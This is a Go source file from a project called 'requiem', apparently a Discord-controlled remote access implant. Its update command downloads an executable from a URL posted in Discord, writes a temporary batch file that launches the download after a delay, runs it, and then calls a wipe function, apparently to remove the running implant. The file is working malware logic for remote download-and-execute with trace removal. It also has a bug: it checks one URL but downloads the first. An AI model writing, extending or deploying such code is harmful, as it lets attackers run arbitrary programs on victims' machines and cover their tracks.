package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"
)

func (*UpdateCommand) Exec(ctx *store.CommandContext, args []string) {
	urls := discord.GetUrls(ctx)
	if len(urls) == 0 {
		ctx.ReplyMsg("🟥 Failed to find any urls.")
		return
	}

	theUrl := ""

	for _, url := range urls {
		ext := filepath.Ext(strings.Split(url, "?")[0])
		if ext != ".exe" {
			continue
		}

		theUrl = url
		break
	}

	if theUrl == "" {
		ctx.ReplyMsg("🟥 Failed to find any executable files.")
		return
	}

	path, err := utils.DownloadFile(urls[0], "")
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to download - %s", err))
		return
	}

	var update strings.Builder
	update.WriteString("@echo off\n")
	update.WriteString("timeout /t 5 /nobreak > nul\n")
	fmt.Fprintf(&update, "start \"\" \"%s\"\n", path)

	name := fmt.Sprintf("%d.bat", time.Now().UnixNano())
	path = filepath.Join(os.TempDir(), name)

	err = os.WriteFile(path, []byte(update.String()), 0666)
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to write file - %s", err))
		return
	}

	ctx.ReplyMsg("Updating...")

	cmd := utils.StartCommand("cmd", "/c", path)
	cmd.Start()

	funcs.Wipe(false)
}

func (*UpdateCommand) Name() string {
	return "update"
}

func (*UpdateCommand) Info() string {
	return "Updates this."
}

type UpdateCommand struct{}
